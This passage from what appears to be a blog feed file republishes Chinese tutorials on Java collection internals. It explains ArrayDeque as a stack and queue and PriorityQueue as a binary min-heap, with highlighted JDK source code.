operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">containsAll</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">removeAll</span><span class="token punctuation">(</span>Collection<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c<span class="token punctuation">)</span>   <span class="token punctuation">{</span><span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">removeAll</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">retainAll</span><span class="token punctuation">(</span>Collection<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c<span class="token punctuation">)</span>   <span class="token punctuation">{</span><span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">retainAll</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// addAll is the only inherited implementation</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>至此<em>Java Collections Framework Internals</em>系列已经全部讲解完毕，希望这几篇简短的博文能够帮助各位读者对Java容器框架建立基本的理解。通过这里可以返回<a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/0-Introduction.md">本系列文章目录</a></p><p>如果对各位有哪怕些微的帮助，博主将感到非常高兴！如果博文中有任何的纰漏和谬误，欢迎各位博友指正。</p><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/9-WeakHashMap.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack and Queue</title>
      <link href="/2019/01/21/java/java-rong-qi/stack-and-queue/"/>
      <url>/2019/01/21/java/java-rong-qi/stack-and-queue/</url>
      
        <content type="html"><![CDATA[<h1 id="Stack-and-Queue"><a href="#Stack-and-Queue" class="headerlink" title="Stack and Queue"></a>Stack and Queue</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Java里有一个叫做<em>Stack</em>的类，却没有叫做<em>Queue</em>的类（它是个接口名字）。当需要使用栈时，Java已不推荐使用<em>Stack</em>，而是推荐使用更高效的<em>ArrayDeque</em>；既然<em>Queue</em>只是一个接口，当需要使用队列时也就首选<em>ArrayDeque</em>了（次选是<em>LinkedList</em>）。</p><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p>要讲栈和队列，首先要讲<em>Deque</em>接口。<em>Deque</em>的含义是“double ended queue”，即双端队列，它既可以当作栈使用，也可以当作队列使用。下表列出了<em>Deque</em>与<em>Queue</em>相对应的接口：</p><table><thead><tr><th>Queue Method</th><th>Equivalent Deque Method</th><th>说明</th></tr></thead><tbody><tr><td><code>add(e)</code></td><td><code>addLast(e)</code></td><td>向队尾插入元素，失败则抛出异常</td></tr><tr><td><code>offer(e)</code></td><td><code>offerLast(e)</code></td><td>向队尾插入元素，失败则返回<code>false</code></td></tr><tr><td><code>remove()</code></td><td><code>removeFirst()</code></td><td>获取并删除队首元素，失败则抛出异常</td></tr><tr><td><code>poll()</code></td><td><code>pollFirst()</code></td><td>获取并删除队首元素，失败则返回<code>null</code></td></tr><tr><td><code>element()</code></td><td><code>getFirst()</code></td><td>获取但不删除队首元素，失败则抛出异常</td></tr><tr><td><code>peek()</code></td><td><code>peekFirst()</code></td><td>获取但不删除队首元素，失败则返回<code>null</code></td></tr></tbody></table><p>下表列出了<em>Deque</em>与<em>Stack</em>对应的接口：</p><table><thead><tr><th>Stack Method</th><th>Equivalent Deque Method</th><th>说明</th></tr></thead><tbody><tr><td><code>push(e)</code></td><td><code>addFirst(e)</code></td><td>向栈顶插入元素，失败则抛出异常</td></tr><tr><td>无</td><td><code>offerFirst(e)</code></td><td>向栈顶插入元素，失败则返回<code>false</code></td></tr><tr><td><code>pop()</code></td><td><code>removeFirst()</code></td><td>获取并删除栈顶元素，失败则抛出异常</td></tr><tr><td>无</td><td><code>pollFirst()</code></td><td>获取并删除栈顶元素，失败则返回<code>null</code></td></tr><tr><td><code>peek()</code></td><td><code>peekFirst()</code></td><td>获取但不删除栈顶元素，失败则抛出异常</td></tr><tr><td>无</td><td><code>peekFirst()</code></td><td>获取但不删除栈顶元素，失败则返回<code>null</code></td></tr></tbody></table><p>上面两个表共定义了<em>Deque</em>的12个接口。添加，删除，取值都有两套接口，它们功能相同，区别是对失败情况的处理不同。<strong>一套接口遇到失败就会抛出异常，另一套遇到失败会返回特殊值（false或null）</strong>。除非某种实现对容量有限制，大多数情况下，添加操作是不会失败的。<strong>虽然Deque的接口有12个之多，但无非就是对容器的两端进行操作，或添加，或删除，或查看</strong>。明白了这一点讲解起来就会非常简单。</p><p><em>ArrayDeque</em>和<em>LinkedList</em>是<em>Deque</em>的两个通用实现，由于官方更推荐使用<em>AarryDeque</em>用作栈和队列，加之上一篇已经讲解过<em>LinkedList</em>，本文将着重讲解<em>ArrayDeque</em>的具体实现。</p><p>从名字可以看出<em>ArrayDeque</em>底层通过数组实现，为了满足可以同时在数组两端插入或删除元素的需求，该数组还必须是循环的，即<strong>循环数组（circular array）</strong>，也就是说数组的任何一点都可能被看作起点或者终点。<em>ArrayDeque</em>是非线程安全的（not thread-safe），当多个线程同时使用的时候，需要程序员手动同步；另外，该容器不允许放入<code>null</code>元素。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayDeque_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayDeque_base.png" alt="ArrayDeque_base.png"></a></p><p>上图中我们看到，<strong>head指向首端第一个有效元素，tail指向尾端第一个可以插入元素的空位</strong>。因为是循环数组，所以<code>head</code>不一定总等于0，<code>tail</code>也不一定总是比<code>head</code>大。</p><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="addFirst"><a href="#addFirst" class="headerlink" title="addFirst()"></a>addFirst()</h2><p><code>addFirst(E e)</code>的作用是在<em>Deque</em>的首端插入元素，也就是在<code>head</code>的前面插入元素，在空间足够且下标没有越界的情况下，只需要将<code>elements[--head] = e</code>即可。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayDeque_addFirst.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayDeque_addFirst.png" alt="ArrayDeque_addFirst.png"></a></p><p>实际需要考虑：1.空间是否够用，以及2.下标是否越界的问题。上图中，如果<code>head</code>为<code>0</code>之后接着调用<code>addFirst()</code>，虽然空余空间还够用，但<code>head</code>为<code>-1</code>，下标越界了。下列代码很好的解决了这两个问题。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//addFirst(E e)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addFirst</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//不允许放入null</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    elements<span class="token punctuation">[</span>head <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>elements<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2.下标是否越界</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> tail<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//1.空间是否够用</span>        <span class="token function">doubleCapacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//扩容</span><span class="token punctuation">}</span></code></pre><p>上述代码我们看到，<strong>空间问题是在插入之后解决的</strong>，因为<code>tail</code>总是指向下一个可插入的空位，也就意味着<code>elements</code>数组至少有一个空位，所以插入元素的时候不用考虑空间问题。</p><p>下标越界的处理解决起来非常简单，<code>head = (head - 1) &amp; (elements.length - 1)</code>就可以了，<strong>这段代码相当于取余，同时解决了head为负值的情况</strong>。因为<code>elements.length</code>必需是<code>2</code>的指数倍，<code>elements - 1</code>就是二进制低位全<code>1</code>，跟<code>head - 1</code>相与之后就起到了取模的作用，如果<code>head - 1</code>为负数（其实只可能是-1），则相当于对其取相对于<code>elements.length</code>的补码。</p><p>下面再说说扩容函数<code>doubleCapacity()</code>，其逻辑是申请一个更大的数组（原数组的两倍），然后将原数组复制过去。过程如下图所示：</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayDeque_doubleCapacity.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayDeque_doubleCapacity.png" alt="ArrayDeque_doubleCapacity.png"></a></p><p>图中我们看到，复制分两次进行，第一次复制<code>head</code>右边的元素，第二次复制<code>head</code>左边的元素。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//doubleCapacity()</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">doubleCapacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">assert</span> head <span class="token operator">==</span> tail<span class="token punctuation">;</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> r <span class="token operator">=</span> n <span class="token operator">-</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// head右边元素的个数</span>    <span class="token keyword">int</span> newCapacity <span class="token operator">=</span> n <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//原空间的2倍</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"Sorry, deque too big"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Object<span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span>newCapacity<span class="token punctuation">]</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>elements<span class="token punctuation">,</span> p<span class="token punctuation">,</span> a<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//复制右半部分，对应上图中绿色部分</span>    System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>elements<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> r<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//复制左半部分，对应上图中灰色部分</span>    elements <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span>    head <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    tail <span class="token operator">=</span> n<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="addLast"><a href="#addLast" class="headerlink" title="addLast()"></a>addLast()</h2><p><code>addLast(E e)</code>的作用是在<em>Deque</em>的尾端插入元素，也就是在<code>tail</code>的位置插入元素，由于<code>tail</code>总是指向下一个可以插入的空位，因此只需要<code>elements[tail] = e;</code>即可。插入完成后再检查空间，如果空间已经用光，则调用<code>doubleCapacity()</code>进行扩容。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/ArrayDeque_addLast.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/ArrayDeque_addLast.png" alt="ArrayDeque_addLast.png"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addLast</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//不允许放入null</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    elements<span class="token punctuation">[</span>tail<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//赋值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>tail <span class="token operator">=</span> <span class="token punctuation">(</span>tail <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>elements<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> head<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//下标越界处理</span>        <span class="token function">doubleCapacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//扩容</span><span class="token punctuation">}</span></code></pre><p>下标越界处理方式<code>addFirt()</code>中已经讲过，不再赘述。</p><h2 id="pollFirst"><a href="#pollFirst" class="headerlink" title="pollFirst()"></a>pollFirst()</h2><p><code>pollFirst()</code>的作用是删除并返回<em>Deque</em>首端元素，也即是<code>head</code>位置处的元素。如果容器不空，只需要直接返回<code>elements[head]</code>即可，当然还需要处理下标的问题。由于<code>ArrayDeque</code>中不允许放入<code>null</code>，当<code>elements[head] == null</code>时，意味着容器为空。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">pollFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    E result <span class="token operator">=</span> elements<span class="token punctuation">[</span>head<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//null值意味着deque为空</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    elements<span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//let GC work</span>    head <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>elements<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//下标越界处理</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="pollLast"><a href="#pollLast" class="headerlink" title="pollLast()"></a>pollLast()</h2><p><code>pollLast()</code>的作用是删除并返回<em>Deque</em>尾端元素，也即是<code>tail</code>位置前面的那个元素。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">pollLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>tail <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>elements<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//tail的上一个位置是最后一个元素</span>    E result <span class="token operator">=</span> elements<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//null值意味着deque为空</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    elements<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//let GC work</span>    tail <span class="token operator">=</span> t<span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="peekFirst"><a href="#peekFirst" class="headerlink" title="peekFirst()"></a>peekFirst()</h2><p><code>peekFirst()</code>的作用是返回但不删除<em>Deque</em>首端元素，也即是<code>head</code>位置处的元素，直接返回<code>elements[head]</code>即可。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> elements<span class="token punctuation">[</span>head<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// elements[head] is null if deque empty</span><span class="token punctuation">}</span></code></pre><h2 id="peekLast"><a href="#peekLast" class="headerlink" title="peekLast()"></a>peekLast()</h2><p><code>peekLast()</code>的作用是返回但不删除<em>Deque</em>尾端元素，也即是<code>tail</code>位置前面的那个元素。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> elements<span class="token punctuation">[</span><span class="token punctuation">(</span>tail <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>elements<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/4-Stack%20and%20Queue.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PriorityQueue</title>
      <link href="/2019/01/21/java/java-rong-qi/priorityqueue/"/>
      <url>/2019/01/21/java/java-rong-qi/priorityqueue/</url>
      
        <content type="html"><![CDATA[<h1 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p>前面以Java <em>ArrayDeque</em>为例讲解了<em>Stack</em>和<em>Queue</em>，其实还有一种特殊的队列叫做<em>PriorityQueue</em>，即优先队列。<strong>优先队列的作用是能保证每次取出的元素都是队列中权值最小的</strong>（Java的优先队列每次取最小元素，C++的优先队列每次取最大元素）。这里牵涉到了大小关系，<strong>元素大小的评判可以通过元素本身的自然顺序（natural ordering），也可以通过构造时传入的比较器</strong>（<em>Comparator</em>，类似于C++的仿函数）。</p><p>Java中<em>PriorityQueue</em>实现了<em>Queue</em>接口，不允许放入<code>null</code>元素；其通过堆实现，具体说是通过完全二叉树（<em>complete binary tree</em>）实现的<strong>小顶堆</strong>（任意一个非叶子节点的权值，都不大于其左右子节点的权值），也就意味着可以通过数组来作为<em>PriorityQueue</em>的底层实现。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/PriorityQueue_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/PriorityQueue_base.png" alt="PriorityQueue_base.png"></a></p><p>上图中我们给每个元素按照层序遍历的方式进行了编号，如果你足够细心，会发现父节点和子节点的编号是有联系的，更确切的说父子节点的编号之间有如下关系：</p><pre class=" language-java"><code class="language-java">leftNo <span class="token operator">=</span> parentNo<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span>rightNo <span class="token operator">=</span> parentNo<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span>parentNo <span class="token operator">=</span> <span class="token punctuation">(</span>nodeNo<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span></code></pre><p>通过上述三个公式，可以轻易计算出某个节点的父节点以及子节点的下标。这也就是为什么可以直接用数组来存储堆的原因。</p><p><em>PriorityQueue</em>的<code>peek()</code>和<code>element</code>操作是常数时间，<code>add()</code>, <code>offer()</code>, 无参数的<code>remove()</code>以及<code>poll()</code>方法的时间复杂度都是<em>log(N)</em>。</p><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="add-和offer"><a href="#add-和offer" class="headerlink" title="add()和offer()"></a>add()和offer()</h2><p><code>add(E e)</code>和<code>offer(E e)</code>的语义相同，都是向优先队列中插入元素，只是<code>Queue</code>接口规定二者对插入失败时的处理不同，前者在插入失败时抛出异常，后则则会返回<code>false</code>。对于<em>PriorityQueue</em>这两个方法其实没什么差别。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/PriorityQueue_offer.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/PriorityQueue_offer.png" alt="PriorityQueue_offer.png"></a></p><p>新加入的元素可能会破坏小顶堆的性质，因此需要进行必要的调整。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//offer(E e)</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">offer</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//不允许放入null元素</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span>        <span class="token function">grow</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//自动扩容</span>    size <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//队列原来为空，这是插入的第一个元素</span>        queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">siftUp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调整</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上述代码中，扩容函数<code>grow()</code>类似于<code>ArrayList</code>里的<code>grow()</code>函数，就是再申请一个更大的数组，并将原数组的元素复制过去，这里不再赘述。需要注意的是<code>siftUp(int k, E x)</code>方法，该方法用于插入元素<code>x</code>并维持堆的特性。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//siftUp()</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftUp</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> E x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> parent <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//parentNo = (nodeNo-1)/2</span>        Object e <span class="token operator">=</span> queue<span class="token punctuation">[</span>parent<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> e<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//调用比较器的比较方法</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>        k <span class="token operator">=</span> parent<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>新加入的元素<code>x</code>可能会破坏小顶堆的性质，因此需要进行调整。调整的过程为：<strong>从k指定的位置开始，将x逐层与当前点的parent进行比较并交换，直到满足x &gt;= queue[parent]为止</strong>。注意这里的比较可以是元素的自然顺序，也可以是依靠比较器的顺序。</p><h2 id="element-和peek"><a href="#element-和peek" class="headerlink" title="element()和peek()"></a>element()和peek()</h2><p><code>element()</code>和<code>peek()</code>的语义完全相同，都是获取但不删除队首元素，也就是队列中权值最小的那个元素，二者唯一的区别是当方法失败时前者抛出异常，后者返回<code>null</code>。根据小顶堆的性质，堆顶那个元素就是全局最小的那个；由于堆用数组表示，根据下标关系，<code>0</code>下标处的那个元素既是堆顶元素。所以<strong>直接返回数组0下标处的那个元素即可</strong>。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/PriorityQueue_peek.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/PriorityQueue_peek.png" alt="PriorityQueue_peek.png"></a></p><p>代码也就非常简洁：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//peek()</span><span class="token keyword">public</span> E <span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0下标处的那个元素就是最小的那个</span><span class="token punctuation">}</span></code></pre><h2 id="remove-和poll"><a href="#remove-和poll" class="headerlink" title="remove()和poll()"></a>remove()和poll()</h2><p><code>remove()</code>和<code>poll()</code>方法的语义也完全相同，都是获取并删除队首元素，区别是当方法失败时前者抛出异常，后者返回<code>null</code>。由于删除操作会改变队列的结构，为维护小顶堆的性质，需要进行必要的调整。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/PriorityQueue_poll.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/PriorityQueue_poll.png" alt="PriorityQueue_poll.png"></a>代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token operator">--</span>size<span class="token punctuation">;</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    E result <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0下标处的那个元素就是最小的那个</span>    E x <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">;</span>    queue<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token 